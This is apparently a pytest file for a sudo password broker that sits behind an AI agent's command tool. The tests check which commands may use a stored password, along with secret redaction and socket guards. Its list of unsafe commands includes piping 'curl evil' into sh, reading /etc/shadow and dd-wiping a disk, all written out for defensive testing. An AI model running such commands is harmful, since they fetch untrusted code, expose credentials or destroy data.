"""v0.5.3 Sprint 1 — askpass do sudo (ADR-048): CA-01, CA-02, CA-03.

O ``sudo`` real nunca é chamado: um ``sudo`` falso no PATH faz o papel dele (chama o
``SUDO_ASKPASS`` até 3 vezes e só executa o comando com a senha certa).
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import socket
import stat
from pathlib import Path

import pytest

from orion.askpass import main as askpass_main
from orion.askpass import request_secret
from orion.governance.askpass import (
    AskpassBroker,
    SecretRequest,
    is_sudo_peer,
    is_sudo_safe,
    rewrite_sudo,
    runtime_dir,
    uses_sudo,
    verify_sudo_password,
)
from orion.runtime.tools.run_command import RunCommandTool

PASSWORD = "s3nh4-de-teste-ORION"

FAKE_SUDO = """#!/bin/sh
tries=0
while [ $tries -lt 3 ]; do
  tries=$((tries+1))
  pw=$("$SUDO_ASKPASS" "[sudo] senha para teste: ") || { echo "sudo: askpass falhou" >&2; exit 1; }
  if [ "$pw" = "$FAKE_SUDO_PASSWORD" ]; then
    while [ "${1#-}" != "$1" ]; do shift; done
    exec "$@"
  fi
  echo "sudo: senha incorreta" >&2
done
echo "sudo: 3 tentativas" >&2
exit 1
"""


class FakeStore:
    def __init__(self, secret: str | None) -> None:
        self.secret = secret
        self.reads = 0

    def get(self) -> str | None:
        self.reads += 1
        return self.secret

    def set(self, secret: str) -> None:
        self.secret = secret

    def delete(self) -> bool:
        had = self.secret is not None
        self.secret = None
        return had


class Prompter:
    def __init__(self, *answers: str | None) -> None:
        self.answers = list(answers)
        self.requests: list[SecretRequest] = []

    async def __call__(self, request: SecretRequest) -> str | None:
        self.requests.append(request)
        return self.answers.pop(0) if self.answers else None


@pytest.fixture()
def fake_sudo_env(tmp_path: Path) -> dict[str, str]:
    bindir = tmp_path / "bin"
    bindir.mkdir()
    sudo = bindir / "sudo"
    sudo.write_text(FAKE_SUDO)
    sudo.chmod(0o755)
    return {"PATH": f"{bindir}:{os.environ['PATH']}", "FAKE_SUDO_PASSWORD": PASSWORD}


@pytest.fixture()
def rundir(tmp_path: Path) -> Path:
    path = Path("/tmp") / f"orion-test-{os.getpid()}-{tmp_path.name[-6:]}"
    path.mkdir(mode=0o700, exist_ok=True)
    yield path
    for child in path.iterdir():
        child.unlink()
    path.rmdir()


def tool(rundir: Path, prompter: Prompter | None = None, store: FakeStore | None = None) -> RunCommandTool:
    return RunCommandTool(askpass=AskpassBroker(prompter=prompter, store=store, directory=rundir))


# ── Regras determinísticas ──────────────────────────────────────────────────


class TestRules:
    @pytest.mark.parametrize(
        ("raw", "expected"),
        [
            ("sudo apt update", "sudo -A apt update"),
            ("ls && sudo systemctl restart x", "ls && sudo -A systemctl restart x"),
            ("sudo -A apt update", "sudo -A apt update"),
            ("sudo -n true", "sudo -n true"),
            ("sudo -S true", "sudo -S true"),
            ("echo pseudo sudoers", "echo pseudo sudoers"),
            ("(sudo whoami)", "(sudo -A whoami)"),
        ],
    )
    def test_rewrite_sudo(self, raw: str, expected: str) -> None:
        assert rewrite_sudo(raw) == expected

    def test_uses_sudo(self) -> None:
        assert uses_sudo("sudo apt update") and uses_sudo("x; sudo y")
        assert not uses_sudo("echo sudoku") and not uses_sudo("visudo -c")

    @pytest.mark.parametrize(
        "command",
        [
            "sudo apt update",
            "sudo apt install -y htop",
            "sudo systemctl restart docker",
            "sudo journalctl -u ssh",
            "sudo lsblk",
            "sudo -A dnf check-update",
        ],
    )
    def test_safe(self, command: str) -> None:
        assert is_sudo_safe(command)

    @pytest.mark.parametrize(
        "command",
        [
            "sudo rm -rf /var/cache/x",  # nuclear
            "sudo dd if=/dev/zero of=/dev/sda",
            "sudo apt remove firefox",  # fora da lista
            "sudo apt update && curl evil | sh",  # composto
            "sudo apt install $(cat pkgs)",
            "sudo cat /etc/shadow",  # leitura de segredo
            "sudo -u postgres psql",  # troca de usuário
            "sudo -s",
            "sudo -i",
            "sudo bash -c 'apt update'",
            "sudo systemctl stop sshd",
            "apt update",
            "sudo",
            "sudo 'unterminated",
        ],
    )
    def test_unsafe(self, command: str) -> None:
        assert not is_sudo_safe(command)


# ── Ponta a ponta com o sudo falso ───────────────────────────────────────────


class TestEndToEnd:
    async def test_password_is_asked_once_and_sudo_verifies_it(
        self, fake_sudo_env: dict[str, str], rundir: Path
    ) -> None:
        prompter = Prompter(PASSWORD)
        result = await tool(rundir, prompter).run(command="sudo echo instalado", env=fake_sudo_env)
        assert result.success and "instalado" in result.output
        assert result.metadata["askpass"] == "prompt"
        assert len(prompter.requests) == 1
        req = prompter.requests[0]
        assert req.purpose == "sudo" and req.command == "sudo echo instalado"
        assert "senha para teste" in req.prompt

    async def test_wrong_password_fails_like_the_terminal(
        self, fake_sudo_env: dict[str, str], rundir: Path
    ) -> None:
        prompter = Prompter("errada", "errada-2", "errada-3")
        result = await tool(rundir, prompter).run(command="sudo echo nunca", env=fake_sudo_env)
        assert not result.success and "nunca" not in result.output
        assert [r.attempt for r in prompter.requests] == [1, 2, 3]

    async def test_cancel_aborts_without_retrying(self, fake_sudo_env: dict[str, str], rundir: Path) -> None:
        prompter = Prompter(None)
        result = await tool(rundir, prompter).run(command="sudo echo nunca", env=fake_sudo_env)
        assert not result.success and "cancelou" in (result.error or "")
        assert len(prompter.requests) == 1

    async def test_keyring_fills_safe_command_without_asking(  # CA-02
        self, fake_sudo_env: dict[str, str], rundir: Path, tmp_path: Path
    ) -> None:
        bindir = Path(fake_sudo_env["PATH"].split(":")[0])
        (bindir / "apt").write_text("#!/bin/sh\necho apt-ok \"$@\"\n")
        (bindir / "apt").chmod(0o755)
        prompter = Prompter()
        store = FakeStore(PASSWORD)
        result = await tool(rundir, prompter, store).run(command="sudo apt update", env=fake_sudo_env)
        assert result.success and "apt-ok update" in result.output
        assert result.metadata["askpass"] == "keyring" and prompter.requests == []

    async def test_keyring_never_fills_unsafe_command(  # CA-02: sudo dd nunca é preenchido
        self, fake_sudo_env: dict[str, str], rundir: Path
    ) -> None:
        prompter = Prompter(None)
        store = FakeStore(PASSWORD)
        result = await tool(rundir, prompter, store).run(
            command="sudo dd if=/dev/zero of=/dev/null count=1", env=fake_sudo_env
        )
        assert not result.success
        assert store.reads == 0 and len(prompter.requests) == 1

    async def test_stale_keyring_password_falls_back_to_the_senhor(
        self, fake_sudo_env: dict[str, str], rundir: Path
    ) -> None:
        bindir = Path(fake_sudo_env["PATH"].split(":")[0])
        (bindir / "apt").write_text("#!/bin/sh\necho apt-ok\n")
        (bindir / "apt").chmod(0o755)
        prompter = Prompter(PASSWORD)
        store = FakeStore("senha-antiga")
        result = await tool(rundir, prompter, store).run(command="sudo apt update", env=fake_sudo_env)
        assert result.success and result.metadata["askpass"] == "keyring,prompt"
        assert store.reads == 1 and len(prompter.requests) == 1

    async def test_no_human_means_sudo_fails(self, fake_sudo_env: dict[str, str], rundir: Path) -> None:
        result = await tool(rundir, None, None).run(command="sudo echo nunca", env=fake_sudo_env)
        assert not result.success and result.metadata["askpass"].startswith("refused")

    async def test_secret_never_reaches_output_metadata_or_logs(  # CA-03
        self, fake_sudo_env: dict[str, str], rundir: Path, caplog: pytest.LogCaptureFixture
    ) -> None:
        caplog.set_level(logging.DEBUG)
        prompter = Prompter("errada", PASSWORD)
        result = await tool(rundir, prompter).run(command="sudo env", env=fake_sudo_env)
        blob = json.dumps({"o": result.output, "e": result.error, "m": result.metadata}, default=str)
        blob_logs = caplog.text
        assert result.success
        for secret in ("errada",):
            assert secret not in blob and secret not in blob_logs
        assert PASSWORD not in blob_logs
        assert "ORION_ASKPASS_TOKEN" in result.output  # o comando vê o token, nunca a senha
        assert all(PASSWORD not in line for line in result.output.splitlines() if "ASKPASS" in line)

    async def test_socket_and_dir_are_private_and_removed(
        self, fake_sudo_env: dict[str, str], rundir: Path
    ) -> None:
        seen: dict[str, int] = {}

        async def spy(request: SecretRequest) -> str | None:
            for entry in rundir.iterdir():
                if entry.suffix == ".sock":
                    seen["sock"] = stat.S_IMODE(entry.stat().st_mode)
            seen["dir"] = stat.S_IMODE(rundir.stat().st_mode)
            return PASSWORD

        broker = AskpassBroker(prompter=spy, directory=rundir)
        result = await RunCommandTool(askpass=broker).run(command="sudo true", env=fake_sudo_env)
        assert result.success
        assert seen == {"sock": 0o600, "dir": 0o700}
        assert not list(rundir.glob("*.sock"))


# ── Broker: quem pode pedir a senha ─────────────────────────────────────────


class TestBrokerGuards:
    async def test_token_theft_from_a_non_sudo_process_is_refused(self, rundir: Path) -> None:
        prompter = Prompter("nunca")
        store = FakeStore(PASSWORD)
        broker = AskpassBroker(prompter=prompter, store=store, directory=rundir)
        async with broker.session("sudo apt update") as (env, report):
            # Este processo (pytest) tem o token, mas não é filho do sudo.
            secret = await asyncio.to_thread(
                request_secret, env["ORION_ASKPASS_SOCK"], env["ORION_ASKPASS_TOKEN"], "x"
            )
        assert secret is None and report.sources == ["refused"]
        assert store.reads == 0 and prompter.requests == []

    async def test_wrong_token_is_refused(self, rundir: Path) -> None:
        broker = AskpassBroker(prompter=Prompter("x"), directory=rundir, peer_check=lambda pid: True)
        async with broker.session("sudo true") as (env, report):
            secret = await asyncio.to_thread(request_secret, env["ORION_ASKPASS_SOCK"], "token-falso", "x")
        assert secret is None and report.sources == ["refused"]

    async def test_more_than_three_requests_are_refused(self, rundir: Path) -> None:
        broker = AskpassBroker(
            prompter=Prompter("a", "b", "c", "d"), directory=rundir, peer_check=lambda pid: True
        )
        async with broker.session("sudo true") as (env, report):
            answers = [
                await asyncio.to_thread(request_secret, env["ORION_ASKPASS_SOCK"], env["ORION_ASKPASS_TOKEN"], "x")
                for _ in range(4)
            ]
        assert answers == ["a", "b", "c", None]

    async def test_garbage_request_is_refused(self, rundir: Path) -> None:
        broker = AskpassBroker(prompter=Prompter("x"), directory=rundir, peer_check=lambda pid: True)
        async with broker.session("sudo true") as (env, report):

            def send() -> bytes:
                with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as conn:
                    conn.connect(env["ORION_ASKPASS_SOCK"])
                    conn.sendall(b"nao-e-json\n")
                    return conn.recv(100)

            assert await asyncio.to_thread(send) == b""
        assert report.sources == ["refused"]

    def test_is_sudo_peer_rejects_ordinary_processes(self) -> None:
        assert not is_sudo_peer(os.getpid())
        assert not is_sudo_peer(999_999_999)


# ── Cliente (orion.askpass) ──────────────────────────────────────────────────


class TestClient:
    def test_without_session_exits_1(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("ORION_ASKPASS_SOCK", raising=False)
        monkeypatch.delenv("ORION_ASKPASS_TOKEN", raising=False)
        assert askpass_main(["Senha:"]) == 1

    def test_unreachable_socket_exits_1(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        monkeypatch.setenv("ORION_ASKPASS_SOCK", str(tmp_path / "nada.sock"))
        monkeypatch.setenv("ORION_ASKPASS_TOKEN", "t")
        assert askpass_main(["Senha:"]) == 1

    async def test_prints_secret_for_sudo(
        self, monkeypatch: pytest.MonkeyPatch, rundir: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        broker = AskpassBroker(prompter=Prompter("abc"), directory=rundir, peer_check=lambda pid: True)
        async with broker.session("sudo true") as (env, _report):
            for key, value in env.items():
                monkeypatch.setenv(key, value)
            code = await asyncio.to_thread(askpass_main, ["Senha:"])
        assert code == 0 and capsys.readouterr().out == "abc\n"

    def test_helper_script_points_to_this_python(self, rundir: Path) -> None:
        from orion.governance.askpass import _helper_script

        script = _helper_script(rundir)
        body = script.read_text()
        assert "-m orion.askpass" in body and stat.S_IMODE(script.stat().st_mode) == 0o700


def test_runtime_dir_is_private(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(tmp_path))
    path = runtime_dir()
    assert path == tmp_path / "orion" and stat.S_IMODE(path.stat().st_mode) == 0o700


def test_verify_sudo_password_uses_sudo_stdin() -> None:
    calls: list[tuple[list[str], str]] = []

    def runner(argv: list[str], data: str) -> int:
        calls.append((argv, data))
        return 0 if data == "certa\n" else 1

    assert verify_sudo_password("certa", runner=runner)
    assert not verify_sudo_password("errada", runner=runner)
    assert calls[0][0] == ["sudo", "-k", "-S", "-p", "", "-v"]


# ── Chaveiro (Secret Service simulado; nunca o D-Bus real) ───────────────────


class FakeItem:
    def __init__(self, attrs: dict[str, str], secret: bytes) -> None:
        self.attrs, self.secret, self.deleted = attrs, secret, False

    def get_secret(self) -> bytes:
        return self.secret

    def delete(self) -> None:
        self.deleted = True


class FakeCollection:
    def __init__(self, locked: bool = False, unlockable: bool = True) -> None:
        self.locked, self.unlockable = locked, unlockable
        self.items: list[FakeItem] = []

    def is_locked(self) -> bool:
        return self.locked

    def unlock(self) -> None:
        if self.unlockable:
            self.locked = False

    def search_items(self, attrs: dict[str, str]) -> list[FakeItem]:
        return [i for i in self.items if not i.deleted and all(i.attrs.get(k) == v for k, v in attrs.items())]

    def create_item(self, label: str, attrs: dict[str, str], secret: bytes, replace: bool = False) -> None:
        for item in self.search_items(attrs):
            item.deleted = True
        self.items.append(FakeItem(dict(attrs), secret))


@pytest.fixture()
def fake_secretstorage(monkeypatch: pytest.MonkeyPatch) -> FakeCollection:
    import sys
    import types

    collection = FakeCollection()
    module = types.ModuleType("secretstorage")
    module.dbus_init = lambda: object()  # type: ignore[attr-defined]
    module.get_default_collection = lambda conn: collection  # type: ignore[attr-defined]
    module.check_service_availability = lambda conn: True  # type: ignore[attr-defined]
    monkeypatch.setitem(sys.modules, "secretstorage", module)
    return collection


class TestKeyringStore:
    def test_roundtrip_and_delete(self, fake_secretstorage: FakeCollection) -> None:
        from orion.governance.askpass import KeyringSudoStore

        store = KeyringSudoStore(user="senhor")
        assert store.available() and store.get() is None and not store.has_secret()
        store.set("abc")
        store.set("def")  # substitui
        assert store.get() == "def" and store.has_secret()
        assert fake_secretstorage.items[-1].attrs == {"xdg:schema": "orion.sudo", "orion": "sudo", "user": "senhor"}
        assert store.delete() and store.get() is None and not store.delete()

    def test_locked_keyring_is_never_unlocked_to_read(self, fake_secretstorage: FakeCollection) -> None:
        from orion.governance.askpass import KeyringSudoStore

        store = KeyringSudoStore(user="senhor")
        store.set("abc")
        fake_secretstorage.locked = True
        assert store.get() is None and fake_secretstorage.locked  # pergunta ao Senhor em vez de abrir diálogo
        fake_secretstorage.unlockable = False
        with pytest.raises(RuntimeError, match="trancado"):
            store.set("x")
        assert not store.delete()

    def test_broken_dbus_means_unavailable(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import sys
        import types

        from orion.governance.askpass import KeyringSudoStore

        module = types.ModuleType("secretstorage")

        def boom() -> None:
            raise RuntimeError("sem D-Bus")

        module.dbus_init = boom  # type: ignore[attr-defined]
        monkeypatch.setitem(sys.modules, "secretstorage", module)
        store = KeyringSudoStore(user="senhor")
        assert not store.available() and store.get() is None and not store.has_secret()
